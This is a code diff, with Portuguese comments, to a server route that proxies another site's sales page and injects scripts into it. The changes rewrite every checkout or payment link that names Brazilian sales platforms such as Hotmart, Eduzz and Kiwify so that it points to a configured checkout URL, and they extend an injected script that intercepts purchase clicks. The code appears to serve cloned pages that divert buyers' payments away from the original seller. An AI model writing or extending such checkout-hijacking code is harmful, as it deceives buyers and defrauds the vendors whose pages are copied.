@@ -90,7 +90,8 @@ export async function GET(
           try { window.history.replaceState(null, '', window.location.pathname + window.location.search); } catch(e) {}
         })();
 
-        const proxyUrl = '/api/proxy?url=';
+        // IMPORTANTE: proxyUrl deve ser absoluto para evitar problemas com <base> ou redirecionamentos de SPA
+        const proxyUrl = window.location.origin + '/api/proxy?url=';
         const targetBaseUrl = '${baseUrl}';
 
         // HACK 2: Proxy de Fetch
@@ -127,7 +128,6 @@ export async function GET(
           return _origOpen.call(this, method, url, async, user, password);
         };
       </script>
-      <base href="${baseUrl}/">
     `;
     $('head').prepend(proxyScript);
 
@@ -247,14 +247,31 @@ export async function GET(
     });
 
     // ═══════════════════════════════════════════════
-    // CHECKOUT INTERCEPTION — Redirecionar compras
+    // CHECKOUT INTERCEPTION — Redirecionar compras fisicamente e via JS
     // ═══════════════════════════════════════════════
 
     if (config.checkout_url) {
+      const checkoutUrl = config.checkout_url;
+
+      // 1. Reescrever fisicamente todos os links de checkout detectados no HTML
+      $('a[href]').each((_, el) => {
+        const href = ($(el).attr('href') || '').toLowerCase();
+        if (
+          href.includes('checkout') || href.includes('pay') || href.includes('comprar') ||
+          href.includes('hotmart') || href.includes('eduzz') || href.includes('monetizze') ||
+          href.includes('kiwify') || href.includes('braip') || href.includes('cakto') ||
+          href.includes('perfectpay') || href.includes('ticto') || href.includes('greenn') ||
+          href.includes('pepper') || href.includes('yampi') || href.includes('cartpanda')
+        ) {
+          // Manter UTMs originais se possível, ou apenas substituir
+          $(el).attr('href', checkoutUrl);
+        }
+      });
+
       const checkoutScript = `
         <script id="page-checkout-interceptor">
         (function() {
-          const CHECKOUT_URL = '${config.checkout_url}';
+          const CHECKOUT_URL = '${checkoutUrl}';
           
           // Capturar UTMs
           const params = new URLSearchParams(window.location.search);
@@ -278,7 +295,8 @@ export async function GET(
                 href.includes('checkout') || href.includes('pay') || href.includes('comprar') ||
                 href.includes('hotmart') || href.includes('eduzz') || href.includes('monetizze') ||
                 href.includes('kiwify') || href.includes('braip') || href.includes('lastlink') ||
-                href.includes('greenn') || href.includes('pepper') ||
+                href.includes('greenn') || href.includes('pepper') || href.includes('cakto') ||
+                href.includes('perfectpay') || href.includes('ticto') || href.includes('yampi') ||
                 link.dataset.checkout
               ) {
                 e.preventDefault();
